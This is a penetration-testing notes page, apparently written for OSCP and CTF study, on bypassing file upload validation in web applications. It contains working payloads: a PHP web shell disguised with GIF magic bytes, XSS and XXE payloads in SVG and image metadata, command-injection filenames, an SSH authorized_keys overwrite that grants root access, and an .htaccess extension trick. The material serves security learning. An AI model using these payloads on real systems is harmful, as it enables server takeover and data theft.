<!doctype html><html lang=en><head><title>Exploting File Upload Functionality :: Hacking Blog</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Techniques with guides on how to exploit file uplaod functionality on web applications"><meta name=keywords content="CTF,hacking,cybersecurity,notes,writeups"><meta name=robots content="noodp"><link rel=canonical href=https://hack.com.cy/notes/web/file-uploads/file-uploads/><link rel=stylesheet href=https://hack.com.cy/css/buttons.min.86f6b4c106b6c6eb690ae5203d36b442c1f66f718ff4e8164fa86cf6c61ad641.css><link rel=stylesheet href=https://hack.com.cy/css/code.min.d529ea4b2fb8d34328d7d31afc5466d5f7bc2f0bc9abdd98b69385335d7baee4.css><link rel=stylesheet href=https://hack.com.cy/css/fonts.min.5bb7ed13e1d00d8ff39ea84af26737007eb5051b157b86fc24487c94f3dc8bbe.css><link rel=stylesheet href=https://hack.com.cy/css/footer.min.eb8dfc2c6a7eafa36cd3ba92d63e69e849e2200e0002a228d137f236b09ecd75.css><link rel=stylesheet href=https://hack.com.cy/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css><link rel=stylesheet href=https://hack.com.cy/css/header.min.75c7eb0e2872d95ff48109c6647d0223a38db52e2561dd87966eb5fc7c6bdac6.css><link rel=stylesheet href=https://hack.com.cy/css/main.min.775ac2af004d44c22a6d000fbd1d9af529642f5cef27399d0280d180af2c2e9b.css><link rel=stylesheet href=https://hack.com.cy/css/menu.min.310d32205bdedd6f43144e3c3273c9deecd238eba5f9108db5ea96ca0cfbe377.css><link rel=stylesheet href=https://hack.com.cy/css/pagination.min.bbb986dbce00a5ce5aca0504b7925fc1c581992a4bf57f163e5d69cc1db7d836.css><link rel=stylesheet href=https://hack.com.cy/css/post.min.ad50c7f4d00e7975918f37fc74c6029e1959a40d66fb5b2c6564a8715e985573.css><link rel=stylesheet href=https://hack.com.cy/css/sidebar.min.d99f1331c4dc2becb305a3d135a35844adbf5c1f39330853456f7e7f5864cb45.css><link rel=stylesheet href=https://hack.com.cy/css/syntax.min.e9ab635cf918bc84b901eb65c0b2caa74c9544245e3647c1af5c129896ef276e.css><link rel=stylesheet href=https://hack.com.cy/css/terminal.min.e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.css><link rel=stylesheet href=https://hack.com.cy/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css><link rel=stylesheet href=https://hack.com.cy/terminal.css><link rel=stylesheet href=https://hack.com.cy/style.css><link rel="shortcut icon" href=https://hack.com.cy/favicon.png><link rel=apple-touch-icon href=https://hack.com.cy/apple-touch-icon.png><meta name=twitter:card content="summary"><meta name=twitter:site content><meta name=twitter:creator content><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="og:title" content="Exploting File Upload Functionality"><meta property="og:description" content="Techniques with guides on how to exploit file uplaod functionality on web applications"><meta property="og:url" content="https://hack.com.cy/notes/web/file-uploads/file-uploads/"><meta property="og:site_name" content="Hacking Blog"><meta property="og:image" content="https://hack.com.cy/og-image.png"><meta property="og:image:width" content="1200"><meta property="og:image:height" content="627"><meta property="article:section" content="CTF"><meta property="article:section" content="OSCP Prep"><meta property="article:section" content="Web"><meta property="article:published_time" content="2025-08-15 00:00:00 +0000 UTC"><meta name=theme-color content="#0a0e14"><meta name=color-scheme content="dark"><link rel=preload href=/fonts/FiraCode-Latin.woff2 as=font type=font/woff2 crossorigin><meta name=viewport content="width=device-width,initial-scale=1,viewport-fit=cover"><script src=https://cdn.jsdelivr.net/npm/fuse.js@6.6.2/dist/fuse.min.js></script><script defer src=https://hack.com.cy/js/search.js></script></head><body><div class="container center"><header class=header><div class=header__inner><div class=header__logo><a href=/why/><div class=logo>Hacking Vault</div></a></div><ul class="menu menu--mobile"><li class=menu__trigger>Menu&nbsp;▾</li><li><ul class=menu__dropdown><li><a href=/why/>Why</a></li><li><a href=/whoami/>Whoami</a></li><li><a href=/writeups/>Writeups</a></li><li><a href=/notes/>Notes</a></li></ul></li></ul></div><nav class=navigation-menu><ul class="navigation-menu__inner menu--desktop"><li><a href=/why/>Why</a></li><li><a href=/whoami/>Whoami</a></li><li><a href=/writeups/>Writeups</a></li><li><a href=/notes/>Notes</a></li><li><button class=search-button onclick=showSearch() aria-label=Search>Search</button></li></ul></nav></header><div class=content><nav class=breadcrumbs aria-label=Breadcrumb><ol class=breadcrumb-list><li class=breadcrumb-item><a href=https://hack.com.cy/ class=breadcrumb-link><span class=breadcrumb-icon>~</span>Home</a></li><li class=breadcrumb-separator>/</li><li class=breadcrumb-item><a href=https://hack.com.cy/notes/ class=breadcrumb-link>Hacking Notes</a></li><li class=breadcrumb-separator>/</li><li class=breadcrumb-item><a href=https://hack.com.cy/notes/web/ class=breadcrumb-link>Web Application Attacks and Techniques</a></li><li class=breadcrumb-separator>/</li><li class=breadcrumb-item><a href=https://hack.com.cy/notes/web/file-uploads/ class=breadcrumb-link></a></li><li class=breadcrumb-separator>/</li><li class="breadcrumb-item breadcrumb-current" aria-current=page><span class=breadcrumb-text>Exploting File Upload Functionality</span></li></ol></nav><style>.breadcrumbs{margin:20px 0 30px;padding:10px 15px;background:var(--background-secondary);border-left:3px solid var(--accent);border-right:1px solid var(--code-border);border-top:1px solid var(--code-border);border-bottom:1px solid var(--code-border)}.breadcrumb-list{display:flex;flex-wrap:wrap;align-items:center;list-style:none;margin:0;padding:0;gap:8px;font-size:.9rem}.breadcrumb-item{display:inline-flex;align-items:center}.breadcrumb-link{color:var(--accent-secondary);text-decoration:none;transition:all .2s ease;display:inline-flex;align-items:center;gap:5px}.breadcrumb-link:hover{color:var(--accent);text-shadow:0 0 5px var(--glow-accent)}.breadcrumb-icon{color:var(--accent);font-weight:700}.breadcrumb-separator{color:var(--code-border);user-select:none}.breadcrumb-current .breadcrumb-text{color:var(--foreground);font-weight:700}@media(max-width:684px){.breadcrumbs{font-size:.85rem;overflow-x:auto}.breadcrumb-list{flex-wrap:nowrap}}</style><article class=post><h1 class=post-title><a href=https://hack.com.cy/notes/web/file-uploads/file-uploads/>Exploting File Upload Functionality</a></h1><div class=post-meta><time class=post-date>2025-08-15&nbsp;[Updated 2026-01-01]</time><span class=post-reading-time>7 min read (1323 words)</span></div><span class=post-tags>#<a href=https://hack.com.cy/tags/web-attacks/>Web Attacks</a>&nbsp;
#<a href=https://hack.com.cy/tags/file-upload/>File Upload</a>&nbsp;
#<a href=https://hack.com.cy/tags/php/>PHP</a>&nbsp;
#<a href=https://hack.com.cy/tags/fuff/>FUFF</a>&nbsp;
#<a href=https://hack.com.cy/tags/seclists/>seclists</a>&nbsp;</span><div class=table-of-contents><h2>Contents</h2><nav id=TableOfContents><ul><li><a href=#identify-web-frameworkprogramming-language>Identify Web Framework/Programming Language</a></li><li><a href=#disabling-front-end-validation>Disabling Front-end Validation</a></li><li><a href=#blacklist-extension-filters>Blacklist Extension Filters</a></li><li><a href=#capitalization>Capitalization</a></li><li><a href=#double-extensions-whitelist-bypasses>Double Extensions (Whitelist Bypasses)</a></li><li><a href=#character-injection>Character Injection</a></li><li><a href=#reverse-extension--custom-bash-script>Reverse Extension (Custom bash script)</a></li><li><a href=#crafting-malicious-image-magic-bytes--mime-type-validation-bypass>Crafting Malicious Image (Magic Bytes) && MIME-Type Validation Bypass</a></li><li><a href=#filter-types>Filter Types</a></li><li><a href=#limited-file-uploads>Limited File Uploads</a><ul><li></li></ul></li><li><a href=#injections-in-file-names>Injections in File Names</a></li><li><a href=#windows-specific-attacks>Windows-specific Attacks</a></li><li><a href=#directory-traversal-on-upload>Directory Traversal on Upload</a></li><li><a href=#htaccess-and-webservers-that-support-it>.htaccess and webservers that support it</a></li></ul></nav></div><div class=post-content><div><p>Checklist:
What framework are we traying to attack.
Check where the validation happens (front-end or back-end).
Can we bypass blacklist extension filters via capitalization or is there any other extension we can uplaod.
Check for the acceptance of double extensions on uploaded files.
Can we inject special characters (e.i, %00) null byte inejection on filename.
Can we bypass file type restrictions by forging valid magic bytes.
If supported by the webserver, can you upload .htaccess files</p><h2 id=identify-web-frameworkprogramming-language>Identify Web Framework/Programming Language<a href=#identify-web-frameworkprogramming-language class=hanchor arialabel=Anchor>#</a></h2><p>First we need to know what kind of technology we are dealing with.
What Programming language is the webapplication using.
Or what framework.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># We can use multuple file extensions to determine what kind of framework we are against</span>
</span></span><span class=line><span class=cl>sudo ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://doman.com/indexFUZZ
</span></span></code></pre></div><blockquote><p>Resources: <a href=https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt>seclists-web-extensions</a></p></blockquote><h2 id=disabling-front-end-validation>Disabling Front-end Validation<a href=#disabling-front-end-validation class=hanchor arialabel=Anchor>#</a></h2><p>We can use the browser dev tools <code>inspector</code> to see if the file validation happens in the front-end or back-end.
If the checks happens in front-end we can attempt to disable it by editting the HTML and altering it or remove it completeley</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1>## Modify the HTML through Inspector (Firefox Dev tools)</span>
</span></span><span class=line><span class=cl>We can find the functionality that checks <span class=k>for</span> the file that is beeing uploaded and modify it or totally remove it.
</span></span></code></pre></div><p><img src=/images/notes-file-upload1.png alt="Image Description"></p><p><img src=/images/notes-file-upload2.png alt="Image Description"></p><hr><h2 id=blacklist-extension-filters>Blacklist Extension Filters<a href=#blacklist-extension-filters class=hanchor arialabel=Anchor>#</a></h2><p>Most of the times there is a kind of restrictions in terms of what kind of files/file types are allowed to be uploaded.
If those restrictions are using blackilist maybe we can bypass it.
Or find alternative file types that we can utilize maliciously.</p><p><code>We can use Burp+Intruder to FUZZ the upload functionality against all the file-extentions and find out according to length of the response if we can bypass the validation or not.</code></p><blockquote><p>REMEMBER: When Using Burp UNTICK the URL encoding</p></blockquote><p><img src=/images/notes-file-upload3.png alt="Image Description"></p><p>We can also use <code>ffuf</code> to achieve the same results.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1>## Fuzzing extensions (using ffuf)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>ffuf -X POST -request upload.txt -request-proto <span class=s2>&#34;http&#34;</span> -w /usr/share/wordlists/seclists/Discovery/Web-Content/web-extensions.txt
</span></span></code></pre></div><blockquote><p>Resources:
<a href=https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt>seclists-web-extensions</a>
<a href=https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst>PHP-extensions</a>
<a href=https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20ASP>.NET/ASP-extensions</a></p></blockquote><h2 id=capitalization>Capitalization<a href=#capitalization class=hanchor arialabel=Anchor>#</a></h2><p>Capitlization can also trick the validation if is not implemented correct and successfully bypass it.
We can also try to change some of the extensions characters to capitals and small: <code>pHP</code> <code>PhPs</code> etc&mldr;</p><hr><h2 id=double-extensions-whitelist-bypasses>Double Extensions (Whitelist Bypasses)<a href=#double-extensions-whitelist-bypasses class=hanchor arialabel=Anchor>#</a></h2><p>We can also attempt to use double extensions to bypass whitelist, sometimes misconfigured web application check only the first iteration and do not process the second one.</p><p>Examples: <code>jpg.php</code> <code>png.php</code> etc.</p><hr><h2 id=character-injection>Character Injection<a href=#character-injection class=hanchor arialabel=Anchor>#</a></h2><p>We can inject several characters before or after the final extension to cause the web application to misinterpret the filename and execute the uploaded file as a PHP script.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>%20
</span></span><span class=line><span class=cl>%0a
</span></span><span class=line><span class=cl>%00
</span></span><span class=line><span class=cl>%0d0a
</span></span><span class=line><span class=cl>/
</span></span><span class=line><span class=cl>.<span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>.
</span></span><span class=line><span class=cl>…
</span></span><span class=line><span class=cl>:
</span></span></code></pre></div><p>We could also use reverse extension.
Here is an automated way to create such a list.</p><h2 id=reverse-extension--custom-bash-script>Reverse Extension (Custom bash script)<a href=#reverse-extension--custom-bash-script class=hanchor arialabel=Anchor>#</a></h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1>## NOTE</span>
</span></span><span class=line><span class=cl>shell.php%00.jpg <span class=o>(</span>works on Linux+PHP server version 5.x and earlier<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>shell.aspx:jpg <span class=o>(</span>works on Windows+ASP<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>The following bash script generates all permutations of a file name before and after both the PHP and JPG extnsions
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> char in <span class=s1>&#39;%20&#39;</span> <span class=s1>&#39;%0a&#39;</span> <span class=s1>&#39;%00&#39;</span> <span class=s1>&#39;%0d0a&#39;</span> <span class=s1>&#39;/&#39;</span> <span class=s1>&#39;.\\&#39;</span> <span class=s1>&#39;.&#39;</span> <span class=s1>&#39;…&#39;</span> <span class=s1>&#39;:&#39;</span><span class=p>;</span> <span class=k>do</span>
</span></span><span class=line><span class=cl>	<span class=k>for</span> ext in <span class=s1>&#39;.php&#39;</span> <span class=s1>&#39;.phps&#39;</span> <span class=s1>&#39;.php3&#39;</span> <span class=s1>&#39;.php4&#39;</span> <span class=s1>&#39;.php5&#39;</span> <span class=s1>&#39;.php7&#39;</span> <span class=s1>&#39;.php8&#39;</span> <span class=s1>&#39;.pht&#39;</span>  <span class=s1>&#39;.phar&#39;</span> <span class=s1>&#39;.phpt&#39;</span> <span class=s1>&#39;.pgif&#39;</span> <span class=s1>&#39;.phtml&#39;</span> <span class=s1>&#39;.phtm&#39;</span><span class=p>;</span> <span class=k>do</span>
</span></span><span class=line><span class=cl>        <span class=nb>echo</span> <span class=s2>&#34;original</span><span class=nv>$char$ext</span><span class=s2>.jpg&#34;</span> &gt;&gt; wordlist.txt
</span></span><span class=line><span class=cl>        <span class=nb>echo</span> <span class=s2>&#34;original</span><span class=nv>$ext$char</span><span class=s2>.jpg&#34;</span> &gt;&gt; wordlist.txt
</span></span><span class=line><span class=cl>        <span class=nb>echo</span> <span class=s2>&#34;original.jpg</span><span class=nv>$char$ext</span><span class=s2>&#34;</span> &gt;&gt; wordlist.txt
</span></span><span class=line><span class=cl>        <span class=nb>echo</span> <span class=s2>&#34;original.jpg</span><span class=nv>$ext$char</span><span class=s2>&#34;</span> &gt;&gt; wordlist.txt
</span></span><span class=line><span class=cl>    <span class=k>done</span>
</span></span><span class=line><span class=cl><span class=k>done</span>
</span></span></code></pre></div><hr><h2 id=crafting-malicious-image-magic-bytes--mime-type-validation-bypass>Crafting Malicious Image (Magic Bytes) && MIME-Type Validation Bypass<a href=#crafting-malicious-image-magic-bytes--mime-type-validation-bypass class=hanchor arialabel=Anchor>#</a></h2><p>This is usually done by inspecting the first few bytes of the file&rsquo;s content, which contain the <code>File Signatur</code> or <code>Magic Bytes</code></p><p>Including <code>magic bytes</code> in the beggining of the file.
Below there are 2 examples of a GIF and a ZIP.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># GIF</span>
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s1>&#39;GIF8&lt;?php system($_GET[&#34;cmd&#34;]); ?&gt;&#39;</span> &gt; shell.gif
</span></span><span class=line><span class=cl>http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language<span class=o>=</span>./images/shell.gif<span class=p>&amp;</span><span class=nv>cmd</span><span class=o>=</span>id
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Zip</span>
</span></span><span class=line><span class=cl><span class=c1># Works only on PHP if the zip wrapper is enabled</span>
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s1>&#39;&lt;?php system($_GET[&#34;cmd&#34;]); ?&gt;&#39;</span> &gt; shell.php <span class=o>&amp;&amp;</span> zip shell.jpg shell.php
</span></span></code></pre></div><hr><h2 id=filter-types>Filter Types<a href=#filter-types class=hanchor arialabel=Anchor>#</a></h2><p>There are TWO common methods for validating the file content:</p><p><code>Content-Type Header</code> or <code>File Content</code></p><blockquote><p>Assume we get an error message <em>Only images are allowed</em> and we upload shell.jpg and we get blocked this means that the file contents is beeing checked.
<a href=https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt>Content-Type Wordlists</a></p></blockquote><hr><h2 id=limited-file-uploads>Limited File Uploads<a href=#limited-file-uploads class=hanchor arialabel=Anchor>#</a></h2><p>Certain file types, like<code>SVG</code>,<code>HTML</code>,<code>XML</code>, and even some image and document files, may allow us to introduce new vulnerabilities to the web application by uploading malicious versions of these files.</p><h4 id=xss>XSS<a href=#xss class=hanchor arialabel=Anchor>#</a></h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1>## When a web application allows us to upload `HTML` files. Although HTML files won&#39;t allow us to execute code (e.g., PHP), it would still be possible to implement JavaScript code.</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>## Another example of XSS attacks is web applications that display an image&#39;s metadata after its upload. For such web applications, we can include an XSS payload in one of the Metadata parameters that accept raw text, like the `Comment` or `Artist` parameters, as follows:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>sudo exiftool -Comment<span class=o>=</span><span class=s1>&#39; &#34;&gt;&lt;img src=1 onerror=alert(window.origin)&gt;&#39;</span> dotpirate.jpg
</span></span><span class=line><span class=cl>sudo exiftool dotpirate.jpg
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>## When the image&#39;s metadata is displayed, the XSS payload should be triggered, and the JavaScript code will be executed to carry the XSS attack.</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>## SVG (Scalable Vector Graphics) images are XML-based. For this reason, we can modify their XML data to include an XSS payload. For example we can write the following to dotpirate.svg:</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=cp>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
</span></span><span class=line><span class=cl><span class=cp>&lt;!DOCTYPE svg PUBLIC &#34;-//W3C//DTD SVG 1.1//EN&#34; &#34;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&#34;&gt;</span>
</span></span><span class=line><span class=cl><span class=nt>&lt;svg</span> <span class=na>xmlns=</span><span class=s>&#34;http://www.w3.org/2000/svg&#34;</span> <span class=na>version=</span><span class=s>&#34;1.1&#34;</span> <span class=na>width=</span><span class=s>&#34;1&#34;</span> <span class=na>height=</span><span class=s>&#34;1&#34;</span><span class=nt>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;rect</span> <span class=na>x=</span><span class=s>&#34;1&#34;</span> <span class=na>y=</span><span class=s>&#34;1&#34;</span> <span class=na>width=</span><span class=s>&#34;1&#34;</span> <span class=na>height=</span><span class=s>&#34;1&#34;</span> <span class=na>fill=</span><span class=s>&#34;green&#34;</span> <span class=na>stroke=</span><span class=s>&#34;black&#34;</span> <span class=nt>/&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;script</span> <span class=na>type=</span><span class=s>&#34;text/javascript&#34;</span><span class=nt>&gt;</span>alert(window.origin);<span class=nt>&lt;/script&gt;</span>
</span></span><span class=line><span class=cl><span class=nt>&lt;/svg&gt;</span>
</span></span></code></pre></div><h4 id=xxe>XXE<a href=#xxe class=hanchor arialabel=Anchor>#</a></h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1>## The following example can be used for an SVG image that leaks the content of (`/etc/passwd`):</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=cp>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
</span></span><span class=line><span class=cl><span class=cp>&lt;!DOCTYPE svg [ &lt;!ENTITY xxe SYSTEM &#34;file:///etc/passwd&#34;&gt;</span> ]&gt;
</span></span><span class=line><span class=cl><span class=nt>&lt;svg&gt;</span><span class=ni>&amp;xxe;</span><span class=nt>&lt;/svg&gt;</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1>## To use XXE to read source code in PHP web applications, we can use the following payload in our SVG image:</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=cp>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
</span></span><span class=line><span class=cl><span class=cp>&lt;!DOCTYPE svg [ &lt;!ENTITY xxe SYSTEM &#34;php://filter/convert.base64-encode/resource=index.php&#34;&gt;</span> ]&gt;
</span></span><span class=line><span class=cl><span class=nt>&lt;svg&gt;</span><span class=ni>&amp;xxe;</span><span class=nt>&lt;/svg&gt;</span>
</span></span></code></pre></div><h2 id=injections-in-file-names>Injections in File Names<a href=#injections-in-file-names class=hanchor arialabel=Anchor>#</a></h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1>## IF the uploaded file name is displayed (i.e., reflected) on the page. We can try injecting a command in the file name, and if the web application uses the file name within an OS command, it may lead to a command injection attack.</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>file<span class=k>$(</span>whoami<span class=k>)</span>.jpg
</span></span><span class=line><span class=cl>file<span class=sb>`</span>whoami<span class=sb>`</span>.jpg
</span></span><span class=line><span class=cl>file.jpg<span class=o>||</span>whoami
</span></span><span class=line><span class=cl>file&lt;script&gt;alert<span class=o>(</span>window.origin<span class=o>)</span><span class=p>;</span>&lt;/script&gt;
</span></span><span class=line><span class=cl>file<span class=err>&#39;</span><span class=p>;</span><span class=k>select</span>+sleep<span class=o>(</span>5<span class=o>)</span><span class=p>;</span>--.jpg
</span></span></code></pre></div><h2 id=windows-specific-attacks>Windows-specific Attacks<a href=#windows-specific-attacks class=hanchor arialabel=Anchor>#</a></h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1>## One such attack is using reserved characters, such as (`|`, `&lt;`, `&gt;`, `*`, or `?`), which are usually reserved for special uses like wildcards.</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>## Finally, we may utilize the Windows [8.3 Filename Convention](https://en.wikipedia.org/wiki/8.3_filename) to overwrite existing files or refer to files that do not exist.</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>For example, to refer to a file called <span class=o>(</span><span class=sb>`</span>dorpitate.txt<span class=sb>`</span><span class=o>)</span> we can use <span class=o>(</span><span class=sb>`</span>HAC~1.TXT<span class=sb>`</span><span class=o>)</span> or <span class=o>(</span><span class=sb>`</span>HAC~2.TXT<span class=sb>`</span><span class=o>)</span>, where the digit represents the order of the matching files that start with <span class=o>(</span><span class=sb>`</span>HAC<span class=sb>`</span><span class=o>)</span>
</span></span></code></pre></div><h2 id=directory-traversal-on-upload>Directory Traversal on Upload<a href=#directory-traversal-on-upload class=hanchor arialabel=Anchor>#</a></h2><p>![[Directory Traversal on File Upload.png]]</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>We can upload a file and change the file name to jump directories and save the file at the root directory.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>If we can overwrite files we couls try overwritting the authorized_keys file in the home directory of root. If this file contains the public key of a private key we control we can access the system via SSH as the root user. 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Execution:
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>sudo ssh-keygen
</span></span><span class=line><span class=cl>Generating public/private rsa key pair.
</span></span><span class=line><span class=cl>Enter file in which to save the key <span class=o>(</span>/home/kali/.ssh/id_rsa<span class=o>)</span>: fileup
</span></span><span class=line><span class=cl>Enter passphrase <span class=o>(</span>empty <span class=k>for</span> no passphrase<span class=o>)</span>: 
</span></span><span class=line><span class=cl>Enter same passphrase again: 
</span></span><span class=line><span class=cl>Your identification has been saved in fileup
</span></span><span class=line><span class=cl>Your public key has been saved in fileup.pub
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>sudo cat fileup.pub &gt; authorized_keys
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Now that the file contains our public key we can upload it to the target and overwrite their authorized_keys.
</span></span></code></pre></div><p>![[Overwritting authorized keys.png]]</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>rm ~/.ssh/known_hosts
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>sudo ssh -i fileup root@mountaindesserts.com
</span></span></code></pre></div><h2 id=htaccess-and-webservers-that-support-it>.htaccess and webservers that support it<a href=#htaccess-and-webservers-that-support-it class=hanchor arialabel=Anchor>#</a></h2><table><thead><tr><th>Web Server</th><th><code>.htaccess</code> Support</th><th>Notes</th></tr></thead><tbody><tr><td><strong>Apache</strong></td><td>✅ Yes</td><td>Must have <code>AllowOverride</code> enabled in <code>httpd.conf</code> or <code>apache2.conf</code>.</td></tr><tr><td><strong>LiteSpeed</strong></td><td>✅ Yes</td><td>Fully supports <code>.htaccess</code> (Apache-compatible).</td></tr><tr><td><strong>OpenLiteSpeed</strong></td><td>⚠️ Partial</td><td>Reads <code>.htaccess</code> only if configured to load Apache rules.</td></tr><tr><td><strong>Nginx</strong></td><td>❌ No</td><td>Does not support <code>.htaccess</code> — configs are in <code>nginx.conf</code>.</td></tr><tr><td><strong>Caddy</strong></td><td>❌ No</td><td>Uses its own configuration syntax.</td></tr><tr><td><strong>IIS</strong></td><td>❌ No</td><td>Uses <code>web.config</code> instead.</td></tr></tbody></table><p>If the upload functionality of a web application saves the files in root <code>/</code> then we can try to upload an <code>.htaccess</code> file allowing our own extensions to be uploaded</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>cat .htaccess
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>AddType application/x-httpd-php .dotpirate
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Now we can upload a file as shell.dotpirate and it will be processed as a PHP file</span>
</span></span></code></pre></div></div></div></article></div><footer class=footer><div class=footer__inner><div class=copyright><span>© 2026 Powered by <a href=https://gohugo.io>Hugo</a></span>
<span>:: <a href=https://github.com/panr/hugo-theme-terminal target=_blank>Theme</a> made by <a href=https://github.com/panr target=_blank>panr</a></span></div></div></footer><script type=text/javascript src=/bundle.min.js></script><div id=search-overlay><div class=search-container><input type=search id=search-input placeholder="Search writeups, notes, and more..." autocomplete=off aria-label=Search><div class=search-hint>Press <kbd>ESC</kbd> to close or <kbd>/</kbd> to open search</div><div id=search-results></div></div><button class=search-close onclick=hideSearch() aria-label="Close search">×</button></div></div></body></html>